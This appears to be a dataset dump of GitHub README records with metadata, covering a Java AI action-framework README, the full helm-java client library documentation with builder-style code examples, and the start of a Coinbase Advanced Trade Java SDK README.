**Authentication Interface:** Specifies the authentication mechanism required to access the endpoint, along with any necessary credentials.  
**Parameter Extraction:** The input parameters defined for each endpoint are extracted and configured within the HttpPredictedAction object.  

**Addition to Prediction List:** Finally, the HttpPredictedAction objects representing the manually defined endpoints are added to the prediction list, making them available for automatic execution based on user prompts.

This approach allows for flexibility in defining HTTP endpoints outside of a Swagger/OpenAPI specification, enabling the manual configuration of endpoints to suit specific application requirements.

### ğŸ–Šï¸ Extended Prediction Loader
The ```ExtendedPredictionLoader``` offers a mechanism for creating custom prediction loaders. While Shell, HTTP, and Java Methods are supported by default, there may arise situations or use cases necessitating a custom set of actions. It's important to note the distinction between custom actions and ```ExtendedPredictedAction.``` Custom actions can be created by implementing the AIAction class, while ExtendedPredictedAction have their own loading mechanism. These actions are already present in the prediction list by default and cannot be predicted again.

To create custom implementations of ExtendedPredictionLoader, you need to annotate the loader class with ```@ActivateLoader.``` Prediction loader will then identify all classes with this annotation and call the ```getExtendedActions()``` method. This method should return the action names along with their corresponding ExtendedPredictOptions, allowing for the seamless integration of custom actions into the prediction system.

## Autonomous Agent 

### Action Script
If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

## Response Validation

### Hallucination

```ZeroShotHallucinationDetector``` is designed to assess the consistency of responses generated by a Large Language Model (LLM) and detect potential hallucinations. It operates by breaking down an original question into multiple granular questions, each probing different aspects or variations of the inquiry. These granular questions are then presented to the LLM separately, generating responses that are subsequently compared to the original question within its original context.

During comparison, factors such as semantic coherence, relevance, and contextual alignment are evaluated to quantify the consistency between each response and the original question. This evaluation results in a percentage score for each response, representing its level of conformity with the original query.

Finally, these individual percentage scores are aggregated to calculate a cumulative percentage. If the cumulative percentage surpasses a predefined threshold, it indicates a discrepancy or potential hallucination.

By systematically analyzing responses in this manner, the class provides a robust mechanism for assessing the reliability and coherence of LLM-generated content.

This method employs a Zero Shot approach to detect hallucination, utilizing a straightforward methodology devoid of external sources. It operates as follows:

Input: The method takes in responses generated by the Large Language Model (LLM) without relying on any additional data sources.

Granular Analysis: It breaks down the original question into multiple granular inquiries, covering diverse aspects or variations of the initial query.

Zero Shot Evaluation: Without external references, the method evaluates each response against the original question, assessing factors such as semantic coherence and contextual relevance.

Consistency Assessment: Based on the comparison, the method quantifies the consistency of each response, assigning a score indicative of its conformity with the original query.

Cumulative Evaluation: These individual scores are then aggregated to derive a cumulative assessment, providing insight into the overall coherence of the LLM-generated responses.

By employing a simple yet effective Zero Shot technique, this method offers a streamlined approach to detect potential hallucinations in LLM-generated content, contributing to the reliability and trustworthiness of AI-generated outputs.

### Bias
### Fairness



## Advanced Reference Examples

This will do a google search and return the result can be combined with multiaction  
```
ActionProcessor processor = new ActionProcessor();
String news = (String)processor.processSingleAction(""can you search the web for Indian news"");

```
Guard Rails with Spring security 
``` Security - Guard Rails using Spring Security``` TBD <br>
``` Application Checkout and monitoring using with Gemini - Prompt - Check if my restaurant system is up and running and able to book the reservation``` TBD <br>
``` Validation with Prompt  - Prompt - What happened the the flight booking i made whats the status?```TBD <br>

## ğŸ§¾ Advanced prompt function calling
``` Can you check if my movie booking system can handle 50 reservations in 1 min ``` <br>
``` what happens if my cookgpt is giving only vegetarian recipes``` <br>",0,0,9,13.0,"['table', 'content', 'rapid', 'start', 'setup', 'gemini', 'openai', 'anthropic', 'reference', 'example', 'java', 'action', 'http', 'action', 'swagger', 'shell', 'action', 'custom', 'http', 'action', 'image', 'action', 'automate', 'ui', 'validation', 'selenium', 'integration', 'spring', 'integration', 'javadocs', 'prediction', 'loader', 'java', 'prediction', 'loader', 'shell', 'prediction', 'loader', 'swagger', 'prediction', 'loader', 'http', 'prediction', 'loader', 'extended', 'prediction', 'loader', 'autonomous', 'agent', 'action', 'script', 'response', 'validation', 'hallucination', 'bias', 'fairness', 'advanced', 'reference', 'example', 'advanced', 'prompt', 'function', 'call']","['action', 'prediction', 'loader', 'http', 'reference']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
manusa/helm-java,main,"# Helm Client for Java

Run Helm commands directly from Java with this client library without the need for a Helm CLI.

It allows you to execute Helm commands directly from Java without requiring a separate Helm installation.
Despite this, it still leverages the native Helm libraries, which are written in Go, to function.
As a result, you can expect the same behavior as you would get from using Helm directly.

## Getting started

Add the dependency to your project:

```xml
<dependency>
  <groupId>com.marcnuri.helm-java</groupId>
  <artifactId>helm-java</artifactId>
  <version>0.0.11</version>
</dependency>
```

Start using it:

```java
public static void main(String... args) {
  new Helm(Paths.get(""path"", ""to"", ""chart"")).install().call();
}
```

Check the features section for more examples and documentation.

## Features

### Create

Equivalent of [`helm create`](https://helm.sh/docs/helm/helm_create/).

Creates a chart directory along with the common files and directories used in a chart.

``` java
Helm.create()
  // Name of the chart to create
  .withName(""test"")
  // Path to the directory where the new chart directory will be created
  .withDir(Paths.get(""/tmp""))
  .call();
```

### Dependency

Equivalent of [`helm dependency`](https://helm.sh/docs/helm/helm_dependency/).

Manage a chart's dependencies.

#### Dependency build

Equivalent of [`helm dependency build`](https://helm.sh/docs/helm/helm_dependency_build/).

Rebuild the chart's on-disk dependencies (`charts/`) based on the Chart.lock file.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().build()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

#### Dependency list

Equivalent of [`helm dependency list`](https://helm.sh/docs/helm/helm_dependency_list/).

List the dependencies for the given chart.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().list()
  .getDependencies();
```

#### Dependency update

Equivalent of [`helm dependency update`](https://helm.sh/docs/helm/helm_dependency_update/).

Update chart's on-disk dependencies (`charts/`) to mirror the contents of Chart.yaml.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().update()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

### Install

Equivalent of [`helm install`](https://helm.sh/docs/helm/helm_install/).

Installs a chart archive.

``` java
// Instantiate the command with chart reference
InstallCommand installCommand = Helm.install(""chart/reference"");
// Instatiate the command with chart archive
InstallCommand installCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).install();
Release result = installCommand
  // Name of the release to install
  .withName(""release-name"")
  // Optionally generate a release name (and omit the name parameter)
  .generateName()
  // Optionally specify a template for the name generation
  .withNameTemplate(""a-chart-{{randAlpha 6 | lower}}"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to install the release into
  .withNamespace(""namespace"")
  // Optionally create the namespace if not present
  .createNamespace()
  // Optionally specify a custom description for the release
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Lint

Equivalent of [`helm lint`](https://helm.sh/docs/helm/helm_lint/).

Examine a chart for possible issues.

``` java
LintResult result = new Helm(Paths.get(""path"", ""to"", ""chart"")).lint()
  // Optionally enable strict mode (fail on lint warnings)
  .strict()
  // Optionally enable quiet mode (only show warnings and errors) 
  .quiet()
  .call();
result.isFailed(); // true if linting failed
result.getMessages(); // list of linting messages
```

### List

Equivalent of [`helm list`](https://helm.sh/docs/helm/helm_list/).

Lists all the releases for a specified namespace (uses current namespace context if namespace not specified).

``` java
List<Release> releases = Helm.list()
  // Optionally specify the Kubernetes namespace to list the releases from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally show all releases without any filter applied
  .all()
  // Optionally show releases across all namespaces
  .allNamespaces()
  // Optionally show deployed releases
  // If no other option is specified, this will be automatically enabled
  .deployed()
  // Optionally show failed releases
  .failed()
  // Optionally show pending releases
  .pending()
  // Optionally show superseded releases
  .superseded()
  // Optionally show uninstalled releases (if 'helm uninstall --keep-history' was used)
  .uninstalled()
  // Optionally show releases that are currently being uninstalled
  .uninstalling()
  .call();
```

### Package

Equivalent of [`helm package`](https://helm.sh/docs/helm/helm_package/).

Package a chart directory into a chart archive.

``` java
Path result = new Helm(Paths.get(""path"", ""to"", ""chart"")).package()
  // Optionally specify a target directory
  .destination(Paths.get(""path"", ""to"", ""destination""))
  // Optionally enable signing
  .sign()
  // Optionally specify a key UID (required if signing)
  .withKey(""KEY_UID"")
  // Optionally specify a keyring (required if signing)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally specify a file containing the passphrase for the signing key
  .withPassphraseFile(Paths.get(""path"", ""to"", ""passphrase""))
  .call();
```

### Push

Equivalent of [`helm push`](https://helm.sh/docs/helm/helm_push/).

Upload a chart to a registry.

``` java
Helm.push()
  // Location of the packaged chart (.tgz) to push
  .withChart(Paths.get(""path"", ""to"", ""chart"", ""package""))
  // URI of the remote registry to push the chart to
  .withRemote(""oci://remote-server.example.com:12345"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Registry

Equivalent of [`helm registry`](https://helm.sh/docs/helm/helm_registry/).

Log in to or log out from a registry.

#### Registry login

Equivalent of [`helm registry login`](https://helm.sh/docs/helm/helm_registry_login/).

Log in to a registry.

``` java
Helm.registry().login()
  // The host to log in to.
  .withHost(""host"")
  // Registry username
  .withUsername(""username"");
  // Registry password or identity token.
  .withPassword(""password"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Registry logout

Equivalent of [`helm registry logout`](https://helm.sh/docs/helm/helm_registry_logout/).

Log out from a registry.

``` java
Helm.registry().logout()
  // The host to log out from.
  .withHost(""host"")
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Repo

Equivalent of [`helm repo`](https://helm.sh/docs/helm/helm_repo/).

Add, list, remove, update, and index chart repositories.

#### Repo add

Equivalent of [`helm repo add`](https://helm.sh/docs/helm/helm_repo_add/).

Add a chart repository.

``` java
Helm.repo().add()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Name of the repository to add
  .withName(""repo-1"")
  // URL of the repository to add
  .withUrl(URI.create(""https://charts.helm.sh/stable""))
  // Optionally specify a username for HTTP basic authentication
  .withUsername(""user"")
  // Optionally specify a password for HTTP basic authentication
  .withPassword(""pass"")
  // Optionally specify an SSL certificate file to identify the HTTPS client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the HTTPS client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  .call()
```

#### Repo list

Equivalent of [`helm repo list`](https://helm.sh/docs/helm/helm_repo_list/).

List chart repositories.

``` java
List<Repository> respositories = Helm.repo().list()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

#### Repo remove

Equivalent of [`helm repo remove`](https://helm.sh/docs/helm/helm_repo_remove/).

Remove one or more chart repositories.

``` java
Helm.repo().remove()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

#### Repo update

Equivalent of [`helm repo update`](https://helm.sh/docs/helm/helm_repo_update/).

Update information of available charts locally from chart repositories.

``` java
Helm.repo().update()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

### Search

Equivalent of [`helm search`](https://helm.sh/docs/helm/helm_search/).

This command provides the ability to search for Helm charts in various places including the Artifact Hub and the repositories you have added.

#### Repo

Equivalent of [`helm search repo`](https://helm.sh/docs/helm/helm_search_repo/).

Search repositories for a keyword in charts.

``` java
List<SearchResult> results = Helm.search().repo()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Optionally set the keyword to match against the repo name, chart name, chart keywords, and description.
  .withKeyword(""keyword"")
  // Optionally use regular expressions for searching.
  .regexp()
  // Optionally search for development versions too (alpha, beta, and release candidate releases).
  .devel()
  // Optionally search using semantic versioning constraints
  .withVersion("">=1.0.0"")
  .call();
```

### Show

Equivalent of [`helm show`](https://helm.sh/docs/helm/helm_show/).

Show information about a chart.

#### Show all

Equivalent of [`helm show all`](https://helm.sh/docs/helm/helm_show_all/).

Show **all** information about a chart.

``` java
// Instantiate the command with chart reference
ShowCommand showCommand = Helm.show(""chart/reference"");
// Instatiate the command with chart archive
ShowCommand showCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).show();
String result = showCommand.all()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show chart

Equivalent of [`helm show chart`](https://helm.sh/docs/helm/helm_show_chart/).

Show the chart's definition.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .chart()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show CRDs

Equivalent of [`helm show crds`](https://helm.sh/docs/helm/helm_show_crds/).

Show the chart's CRDs.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .crds()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show README

Equivalent of [`helm show readme`](https://helm.sh/docs/helm/helm_show_readme/).

Show the chart's README.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .readme()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show values

Equivalent of [`helm show values`](https://helm.sh/docs/helm/helm_show_values/).

Show the chart's values.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .values()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Template

Equivalent of [`helm template`](https://helm.sh/docs/helm/helm_template/).

This command renders chart templates locally and displays the output.

``` java
// Instantiate the command with chart reference
TemplateCommand templateCommand = Helm.template(""chart/reference"");
// Instatiate the command with chart archive
TemplateCommand templateCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).template();
String result = templateCommand
  // Optionally specify a name for the release
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally set values for the chart
  .set(""key"", ""value"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable debug mode to print out verbose information
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Test

Equivalent of [`helm test`](https://helm.sh/docs/helm/helm_test/).

This command runs the tests for a release.

``` java
Release result = Helm.test(""chart/reference"")
  // Optionally specify the time (in seconds) to wait for any individual Kubernetes operation (like Jobs for hooks) (default 300)
  .withTimeout(int timeout)
  // Optionally specify the Kubernetes namespace
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Uninstall

Equivalent of [`helm uninstall`](https://helm.sh/docs/helm/helm_uninstall/).

This command takes a release name and uninstalls the release.

``` java
String result = Helm.uninstall(""chart/reference"")
  // Optionally enable dry run mode to simulate an uninstall
  .dryRun()
  // Optionally prevent hooks from running during uninstallation
  .noHooks()
  // Optionally treat ""release not found"" as a successful uninstall
  .ignoreNotFound()
  // Optionally remove all associated resources and mark the release as deleted, but retain the release history
  .keepHistory()
  // Optionally select the deletion cascading strategy for the dependents. If unset, defaults to background
  .withCascade(Cascade.BACKGROUND)
  // Optionally specify the Kubernetes namespace to uninstall the release from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Upgrade

Equivalent of [`helm upgrade`](https://helm.sh/docs/helm/helm_upgrade/).

Upgrades a release to a new version of a chart.

``` java
// Instantiate the command with chart reference
UpgradeCommand upgradeCommand = Helm.upgrade(""chart/reference"");
// Instatiate the command with chart archive
UpgradeCommand upgradeCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).upgrade();
Release result = upgradeCommand
  // Name of the release to upgrade
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to upgrade the release
  .withNamespace(""namespace"")
  // Optionally run an installation if a release by this name doesn't already exist
  .install()
  // Optionally force resource updates through a replacement strategy
  .force()
  // Optionally reset the values to the ones built into the chart when upgrading
  .resetValues()
  // Optionally reuse the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues()
  .reuseValues()
  // Optionally reset the values to the ones built into the chart,
  // apply the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues() or reuseValues()
  .resetThenReuseValues()
  // Optionally, if set, upgrade process rolls back changes made in case of failed upgrade
  .atomic()
  // Optionally allow deletion of new resources created in this upgrade when upgrade fails
  .cleanupOnFail()
  // Optionally create the release namespace if not present (if install() is set)
  .createNamespace()
  // Optionally specify a custom description
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Version

Similar to [`helm version`](https://helm.sh/docs/helm/helm_version/).

Returns the version of the underlying Helm library.

``` java
String version = Helm.version();
```

## Development

### Project Structure

- Go:
  - `native`: contains the Go project that creates the native c bindings
- Java:
  - `helm-java`: contains the actual Helm Java client library
  - `lib`: contains the Java modules related to the native c binding libraries
    - `api`: contains the API for the native interfaces
    - `darwin-amd64`: contains the Java native access library for darwin/amd64
    - `darwin-arm64`: contains the Java native access library for darwin/arm64
    - `linux-amd64`: contains the Java native access library for linux/amd64
    - `linux-arm64`: contains the Java native access library for linux/arm64
    - `windows-amd64`: contains the Java native access library for windows/amd64

### Release Process

#### Release to Maven Central

To release a new version automatically:

```shell
make release V=X.Y.Z VS=X.Y
```
- `V`: New version to release.
- `VS`: New SNAPSHOT version for Maven.

To release a new version manually:

1. Update the version in the `pom.xml` file.
   ```shell
   mvn versions:set -DnewVersion=X.Y.Z -DgenerateBackupPoms=false
   ```
2. Commit and tag the release with the  `pom.xml` version.
   ```shell
   git add .
   git commit -m ""[RELEASE] vX.Y.Z released""
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```
3. Update the version in the `pom.xml` file to the next snapshot version.
   ```shell
   mvn versions:set -DnewVersion=X.Y-SNAPSHOT -DgenerateBackupPoms=false
   ```
4. Commit the changes with the following message:
   ```shell
   git add .
   git commit -m ""[RELEASE] v0.0.11 released, prepare for next development iteration""
   git push origin master
   ```

#### Create GitHub Release

Once the release is published to Maven Central, create a new [GitHub release](https://github.com/manusa/helm-java/releases/new) for the released tag.

### License Headers

Whenever a new file is created, the license header must be added. To add the license header to all files:

```shell
make license
```
",11,9,2,62.0,"['helm', 'client', 'java', 'get', 'start', 'feature', 'create', 'dependency', 'dependency', 'build', 'dependency', 'list', 'dependency', 'update', 'install', 'lint', 'list', 'package', 'push', 'registry', 'registry', 'login', 'registry', 'logout', 'repo', 'repo', 'add', 'repo', 'list', 'repo', 'remove', 'repo', 'update', 'search', 'repo', 'show', 'show', 'show', 'chart', 'show', 'crds', 'show', 'readme', 'show', 'value', 'template', 'test', 'uninstall', 'upgrade', 'version', 'development', 'project', 'structure', 'release', 'process', 'release', 'maven', 'central', 'create', 'github', 'release', 'license', 'header']","['repo', 'show', 'dependency', 'list', 'registry']",8.0,"[maven-jar-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,7.0,1.0
coinbase-samples/advanced-sdk-java,main,"# Coinbase Advanced Trade Java SDK README

## Overview

The *Advanced Java SDK* is a sample library that demonstrates the structure of a [Coinbase Advanced Trade](https://advanced.coinbase.com/) driver for
the [REST APIs](https://docs.cdp.coinbase.com/advanced-trade/reference).

Coinbase Advanced Trade offers a comprehensive API for traders, providing access to real-time market data, order management, and execution. Elevate your trading strategies and develop sophisticated solutions using our powerful tools and features.

## License

The *Advanced Java SDK* sample library is free and open source and released under the [Apache License, Version 2.0](LICENSE).

The application and code are only available for demonstration purposes.

## Usage

To use the *Advanced Java SDK*, initialize the Credentials class and create a new client. The Credentials struct is JSON
